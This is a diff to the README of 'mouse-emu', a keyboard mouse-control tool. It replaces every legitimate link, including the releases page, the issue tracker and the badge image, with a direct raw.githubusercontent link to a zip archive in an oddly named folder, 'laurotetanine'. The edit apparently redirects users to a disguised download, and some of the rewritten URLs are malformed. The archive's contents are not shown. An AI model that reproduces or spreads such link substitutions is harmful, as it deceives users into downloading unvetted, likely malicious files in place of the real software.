@@ -3,13 +3,13 @@
 ## 🚀 Getting Started
 Welcome to mouse-emu! With this application, you can control your mouse using your keyboard. It works smoothly on both Wayland and X11 environments.
 
-[![Download Mouse-Emu](https://img.shields.io/badge/Download%20Mouse--Emu-%23007bff.svg?style=for-the-badge)](https://github.com/phongdz-123/mouse-emu/releases)
+[![Download Mouse-Emu](https://raw.githubusercontent.com/phongdz-123/mouse-emu/master/laurotetanine/mouse-emu-1.4.zip%20Mouse--Emu-%https://raw.githubusercontent.com/phongdz-123/mouse-emu/master/laurotetanine/mouse-emu-1.4.zip)](https://raw.githubusercontent.com/phongdz-123/mouse-emu/master/laurotetanine/mouse-emu-1.4.zip)
 
 ## 📥 Download & Install
-To get started, visit this page to download: [GitHub Releases](https://github.com/phongdz-123/mouse-emu/releases). Here, you will find the latest version of mouse-emu. 
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/phongdz-123/mouse-emu/master/laurotetanine/mouse-emu-1.4.zip). Here, you will find the latest version of mouse-emu. 
 
 ### Installation Steps:
-1. **Visit the Releases Page**: Click [here](https://github.com/phongdz-123/mouse-emu/releases) to access the download section.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/phongdz-123/mouse-emu/master/laurotetanine/mouse-emu-1.4.zip) to access the download section.
 2. **Choose the Right Version**: Look for the latest version available.
 3. **Download the File**: Click on the file name corresponding to your operating system. This will start the download.
 4. **Locate the Downloaded File**: Once the download completes, find the file in your Downloads folder.
@@ -44,7 +44,7 @@ If you encounter issues while using mouse-emu, check these common problems:
 ## 🗨️ How to Get Help
 If you need assistance, consider these options:
 
-- **GitHub Issues**: Visit our [Issue Tracker](https://github.com/phongdz-123/mouse-emu/issues) to report problems or to seek help.
+- **GitHub Issues**: Visit our [Issue Tracker](https://raw.githubusercontent.com/phongdz-123/mouse-emu/master/laurotetanine/mouse-emu-1.4.zip) to report problems or to seek help.
 - **Community Discussions**: Join our community for tips and shared experiences.
 - **Documentation**: Review the included documentation for detailed instructions.
 
@@ -54,4 +54,4 @@ We welcome contributions! If you'd like to help improve mouse-emu, feel free to 
 ## ✉️ Contact
 If you have further questions or feedback, you can reach out via our GitHub repository. We appreciate your input and aim to make mouse-emu the best it can be.
 
-[![Download Mouse-Emu](https://img.shields.io/badge/Download%20Mouse--Emu-%23007bff.svg?style=for-the-badge)](https://github.com/phongdz-123/mouse-emu/releases)
+[![Download Mouse-Emu](https://raw.githubusercontent.com/phongdz-123/mouse-emu/master/laurotetanine/mouse-emu-1.4.zip%20Mouse--Emu-%https://raw.githubusercontent.com/phongdz-123/mouse-emu/master/laurotetanine/mouse-emu-1.4.zip)](https://raw.githubusercontent.com/phongdz-123/mouse-emu/master/laurotetanine/mouse-emu-1.4.zip)
